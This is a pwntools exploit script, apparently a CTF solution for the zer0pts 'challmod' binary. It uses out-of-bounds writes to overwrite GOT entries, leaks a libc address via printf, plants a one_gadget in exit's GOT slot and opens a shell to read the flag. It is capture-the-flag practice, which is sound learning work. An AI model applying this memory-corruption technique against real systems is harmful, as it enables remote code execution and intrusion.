#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'pwn.ctf.zer0pts.com', 9004
binary = './challmod'

elf = ELF("challmod")
libc = ELF("libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
#context.log_level = "debug"

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)
    context.noptrace = True
    context.aslr = True
else:
    io = process("./challmod",env = {"LD_PRELOAD" : "./libc.so.6"})
    context.aslr = True

main = 0x400737
printf_got = 0x601028
calloc_got = 0x601038
exit_got = 0x601048
puts_got = 0x601018
main2 = 0x4007a8
printf_plt = 0x400600
main3 = 0x400788
main4 = 0x400792
got = 0x601060

def n(data):
    sla("n = ", str(data))

def offset(data):
    sla("i = ", str(data))

def data(data):
    sla("] = ", str(data))

if __name__=="__main__":
    n(-1)
    offset(puts_got / 4)
    data(main)

    n(-1)
    offset(exit_got / 4)
    data(main2)

    n(-1)
    offset((exit_got + 4) / 4)
    data(0)

    n(-1)
    offset(puts_got / 4)
    data(main3)

    offset(calloc_got / 4)
    data(printf_plt)

    offset((calloc_got + 4) / 4)
    data(0)
    
    offset(puts_got / 4)
    data(main)

    n(0)
    offset(0 - ((0xffffffff - exit_got + 1) / 4))
    data(0x40082100)
    
    n(printf_got)
    libc.address = u64(io.recv(6).ljust(8, "\x00")) - libc.symbols['printf']
    gadget = libc.address + 0xe6e79
    log.info("Libc - "+hex(libc.address))

    offset((exit_got - 4) / 4)
    upper = (gadget << 8) & 0xffff
    middle = (gadget << 8) & 0xffffffff
    lower = gadget >> 24
    data(upper)

    n(0)
    offset(0 - ((0xffffffff - exit_got + 1) / 4))
    data(middle)

    n(0)
    offset(0 - ((0xffffffff - exit_got + 1) / 4) + 1)
    data(lower)

    n(1000)
    sl('cat flag*')
    io.interactive()